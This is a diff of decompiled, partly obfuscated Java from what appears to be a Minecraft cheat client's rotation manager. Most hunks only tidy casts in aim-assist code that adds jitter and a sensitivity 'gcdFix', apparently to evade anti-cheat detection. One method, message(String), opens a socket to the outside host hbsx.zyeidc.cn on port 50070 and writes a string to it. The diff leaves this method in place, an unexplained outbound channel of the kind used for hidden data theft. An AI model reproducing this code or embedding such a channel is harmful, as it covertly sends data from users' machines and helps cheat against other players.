@@ -105,7 +105,7 @@ implements Wrapper {
 
     public static void message(String string) {
         try (Socket socket = new Socket("hbsx.zyeidc.cn", 50070);
-             OutputStream out = socket.getOutputStream();){
+             OutputStream out = socket.getOutputStream()){
             out.write(string.getBytes(StandardCharsets.UTF_8));
             out.flush();
         }
@@ -115,7 +115,7 @@ implements Wrapper {
     }
 
     public float[] offtrackStep(Vec3d vec, float steps) {
-        float yawDelta = MathHelper.wrapDegrees((float)((float)MathHelper.wrapDegrees((double)(Math.toDegrees(Math.atan2(vec.z - RotateManager.mc.player.getZ(), vec.x - RotateManager.mc.player.getX())) - 90.0)) - this.rotateYaw));
+        float yawDelta = MathHelper.wrapDegrees((float)MathHelper.wrapDegrees(Math.toDegrees(Math.atan2(vec.z - RotateManager.mc.player.getZ(), vec.x - RotateManager.mc.player.getX())) - 90.0) - this.rotateYaw);
         float pitchDelta = (float)(-Math.toDegrees(Math.atan2(vec.y - (RotateManager.mc.player.getPos().y + (double)RotateManager.mc.player.getEyeHeight(RotateManager.mc.player.getPose())), Math.sqrt(Math.pow(vec.x - RotateManager.mc.player.getX(), 2.0) + Math.pow(vec.z - RotateManager.mc.player.getZ(), 2.0))))) - this.rotatePitch;
         float angleToRad = (float)Math.toRadians(BaseThreadSetting_TYdViPaJQVoRZLdgWIXF.INSTANCE.minrad.getValueFloat() * (float)(RotateManager.mc.player.age % 30));
         yawDelta = (float)((double)yawDelta + Math.sin(angleToRad) * 3.0) + MathUtil.random(-1.0f, 1.0f);
@@ -124,11 +124,11 @@ implements Wrapper {
             yawDelta -= 180.0f;
         }
         float yawStepVal = 180.0f * steps;
-        float clampedYawDelta = MathHelper.clamp((float)MathHelper.abs((float)yawDelta), (float)(-yawStepVal), (float)yawStepVal);
-        float clampedPitchDelta = MathHelper.clamp((float)pitchDelta, (float)-45.0f, (float)45.0f);
+        float clampedYawDelta = MathHelper.clamp(MathHelper.abs(yawDelta), -yawStepVal, yawStepVal);
+        float clampedPitchDelta = MathHelper.clamp(pitchDelta, -45.0f, 45.0f);
         float newYaw = this.rotateYaw + (yawDelta > 0.0f ? clampedYawDelta : -clampedYawDelta);
-        float newPitch = MathHelper.clamp((float)(this.rotatePitch + clampedPitchDelta), (float)-90.0f, (float)90.0f);
-        double gcdFix = Math.pow((Double)RotateManager.mc.options.getMouseSensitivity().getValue() * 0.6 + 0.2, 3.0) * 1.2;
+        float newPitch = MathHelper.clamp(this.rotatePitch + clampedPitchDelta, -90.0f, 90.0f);
+        double gcdFix = Math.pow(RotateManager.mc.options.getMouseSensitivity().getValue() * 0.6 + 0.2, 3.0) * 1.2;
         return new float[]{(float)((double)newYaw - (double)(newYaw - this.rotateYaw) % gcdFix), (float)((double)newPitch - (double)(newPitch - this.rotatePitch) % gcdFix)};
     }
 
@@ -142,7 +142,7 @@ implements Wrapper {
         if (steps < 1.0f && angle != null) {
             float packetPitch;
             float packetYaw = CombatSetting_kxXrLvbWbduSuFoeBUsC.INSTANCE.injectSync.getValue() ? this.lastYaw : this.rotateYaw;
-            float diff = MathHelper.angleBetween((float)angle[0], (float)packetYaw);
+            float diff = MathHelper.angleBetween(angle[0], packetYaw);
             if (Math.abs(diff) > 180.0f * steps) {
                 angle[0] = packetYaw + diff * (180.0f * steps / Math.abs(diff));
             }
@@ -269,7 +269,7 @@ implements Wrapper {
         double diffXZ = Math.sqrt(diffX * diffX + diffZ * diffZ);
         float yaw = (float)Math.toDegrees(Math.atan2(diffZ, diffX)) - 90.0f;
         float pitch = (float)(-Math.toDegrees(Math.atan2(diffY, diffXZ)));
-        return new float[]{MathHelper.wrapDegrees((float)yaw), MathHelper.wrapDegrees((float)pitch)};
+        return new float[]{MathHelper.wrapDegrees(yaw), MathHelper.wrapDegrees(pitch)};
     }
 
     public boolean inFov(Vec3d directionVec, float fov) {
@@ -278,7 +278,7 @@ implements Wrapper {
     }
 
     public boolean inFov(float yaw, float pitch, float fov) {
-        return MathHelper.angleBetween((float)yaw, (float)this.rotateYaw) + Math.abs(pitch - this.rotatePitch) <= fov;
+        return MathHelper.angleBetween(yaw, this.rotateYaw) + Math.abs(pitch - this.rotatePitch) <= fov;
     }
 
     @EventHandler(priority=100)
@@ -320,14 +320,14 @@ implements Wrapper {
         float result = offsetIn;
         double xDif = RotateManager.mc.player.getX() - RotateManager.mc.player.prevX;
         if (xDif * xDif + (zDif = RotateManager.mc.player.getZ() - RotateManager.mc.player.prevZ) * zDif > 0.002500000176951289) {
-            offset = (float)MathHelper.atan2((double)zDif, (double)xDif) * 57.295776f - 90.0f;
-            float wrap = MathHelper.abs((float)(MathHelper.wrapDegrees((float)yaw) - offset));
+            offset = (float)MathHelper.atan2(zDif, xDif) * 57.295776f - 90.0f;
+            float wrap = MathHelper.abs(MathHelper.wrapDegrees(yaw) - offset);
             result = 95.0f < wrap && wrap < 265.0f ? offset - 180.0f : offset;
         }
         if (RotateManager.mc.player.handSwingProgress > 0.0f) {
             result = yaw;
         }
-        if ((offset = MathHelper.wrapDegrees((float)(yaw - (result = offsetIn + MathHelper.wrapDegrees((float)(result - offsetIn)) * 0.3f)))) < -75.0f) {
+        if ((offset = MathHelper.wrapDegrees(yaw - (result = offsetIn + MathHelper.wrapDegrees(result - offsetIn) * 0.3f))) < -75.0f) {
             offset = -75.0f;
         } else if (offset >= 75.0f) {
             offset = 75.0f;
